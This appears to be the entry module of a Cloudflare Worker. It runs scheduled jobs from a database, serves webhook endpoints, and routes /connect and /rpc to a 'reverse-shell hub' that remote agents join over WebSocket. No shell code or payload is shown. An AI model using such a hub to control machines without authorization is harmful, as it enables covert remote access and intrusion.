import { getEnabledJobs } from './lib/d1.js';
import { filterDueJobs } from './cron/scheduler.js';
import { executeJob } from './cron/executor.js';
import { handleShellHub, ShellHub } from './shellHub.js';
import { handleWebhook, webhookStatus, webhookTick } from './webhook.js';
import type { Env } from './types/index.js';

// The Durable Object class must be exported from the entry module.
export { ShellHub };

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const p = url.pathname;

    // Reverse-shell hub (vault9): agent WebSocket + guarded control RPC.
    if (p === '/connect' || p === '/rpc') return handleShellHub(request, env);

    // 1-minute recurring trigger / input webhook.
    if (p === '/webhook') return handleWebhook(request, env);
    if (p === '/webhook/status') return webhookStatus(env);

    return new Response('Cron Executor Worker OK', { status: 200 });
  },

  async scheduled(_event: ScheduledEvent, env: Env, ctx: ExecutionContext): Promise<void> {
    // Recurring (1-min) trigger heartbeat.
    ctx.waitUntil(webhookTick(env));

    const now = new Date();
    const allJobs = await getEnabledJobs(env.DB);
    const dueJobs = filterDueJobs(allJobs, now);

    if (dueJobs.length === 0) return;

    const executions = dueJobs.map(job =>
      executeJob(job, env).catch(err => {
        console.error(`Job ${job.id} (${job.title}) failed:`, err);
      })
    );

    ctx.waitUntil(Promise.allSettled(executions));
  },
};
